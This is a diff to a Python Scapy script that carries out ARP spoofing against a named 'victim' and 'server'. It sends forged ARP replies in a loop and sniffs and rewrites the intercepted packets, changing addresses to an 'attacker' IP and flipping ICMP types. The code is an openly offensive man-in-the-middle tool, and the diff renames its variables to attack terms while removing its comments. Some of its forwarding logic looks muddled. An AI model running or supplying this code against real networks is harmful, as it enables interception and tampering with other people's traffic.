@@ -5,75 +5,58 @@ from scapy.sendrecv import send, sniff
 from scapy.layers.inet import IP, ICMP
 
 
-# Define the ARP spoofing function to send fake ARP packets to the target and gateway
-def arp_spoof(target_ip, gateway_ip):
-    # Get the MAC addresses of the target and gateway
-    target_mac = getmacbyip(target_ip)
-    gateway_mac = getmacbyip(gateway_ip)
+def arp_spoof(victim_ip, server_ip):
+    victim_mac = getmacbyip(victim_ip)
+    server_mac = getmacbyip(server_ip)
 
-    # Craft ARP packets with the appropriate source and destination IP and MAC addresses
-    target_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
-    gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
+    victim_packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=server_ip)
+    server_packet = ARP(op=2, pdst=server_ip, hwdst=server_mac, psrc=victim_ip)
 
-    # Send the ARP packets to the network
-    send(target_packet, verbose=False)
-    send(gateway_packet, verbose=False)
+    send(victim_packet, verbose=False)
+    send(server_packet, verbose=False)
 
 
-# Define the packet forwarding function to forward packets between the target and gateway through our own computer
-def forward_packets(packet, target_ip, gateway_ip, our_ip):
-    # Check if the packet is an IP packet
+def forward_packets(packet, victim_ip, server_ip, attacker_ip):
     if packet.haslayer(IP):
-        # If the packet was sent by the target to the gateway, forward it through our own computer
-        if packet[IP].src == target_ip and packet[IP].dst == gateway_ip:
-            # Change the packet's source IP address to our own IP address
-            packet[IP].src = our_ip
+        if packet[IP].src == victim_ip and packet[IP].dst == server_ip:
+            packet[IP].src = attacker_ip
 
-            # If the packet is an ICMP packet, modify the type to echo reply
             if packet.haslayer(ICMP):
                 packet[ICMP].type = 0
 
-            # Send the packet to the gateway
             send(packet)
 
-        # If the packet was sent by the gateway to the target, forward it through our own computer
-        elif packet[IP].src == gateway_ip and packet[IP].dst == target_ip:
-            # Change the packet's destination IP address to our own IP address
-            packet[IP].dst = our_ip
+        elif packet[IP].src == server_ip and packet[IP].dst == victim_ip:
+            packet[IP].dst = attacker_ip
 
-            # If the packet is an ICMP packet, modify the type to echo request
             if packet.haslayer(ICMP):
                 packet[ICMP].type = 8
 
-            # Send the packet to the target
             send(packet)
 
 
 if __name__ == "__main__":
-    # Check that the script is being used correctly with three arguments (target IP, gateway IP, and our own IP)
     if len(sys.argv) != 4:
-        print("Usage: " + sys.argv[0] + " <target_ip> <gateway_ip> <our_ip>")
+        print("Usage: " + sys.argv[0] + " <victim_ip> <server_ip> <attacker_ip>")
         sys.exit(1)
-    # Get the target IP and gateway IP from the command-line arguments
-    target_ip = sys.argv[1]
-    gateway_ip = sys.argv[2]
-    our_ip = sys.argv[3]
 
-    # Set the network interface to use for ARP spoofing and packet sniffing
+    victim_ip = sys.argv[1]
+    server_ip = sys.argv[2]
+    attacker_ip = sys.argv[3]
+
     iface = "eth0"
 
-    # Start ARP spoofing by sending fake ARP packets to the target and gateway
     print("[+] Starting ARP spoofing...")
     while True:
         try:
-            arp_spoof(target_ip, gateway_ip)
-            time.sleep(2)  # Pause for 2 seconds between sending ARP packets
+            arp_spoof(victim_ip, server_ip)
+            time.sleep(2)
         except KeyboardInterrupt:
             print("\n[+] Stopping ARP spoofing...")
             break
 
-    # Start packet sniffing on the network interface to capture packets between the target and gateway
     print("[+] Starting packet sniffing...")
     sniff(
-        iface, prn=lambda packet: forward_packets(packet, target_ip, gateway_ip, our_ip)
+        iface,
+        prn=lambda packet: forward_packets(packet, victim_ip, server_ip, attacker_ip),
     )
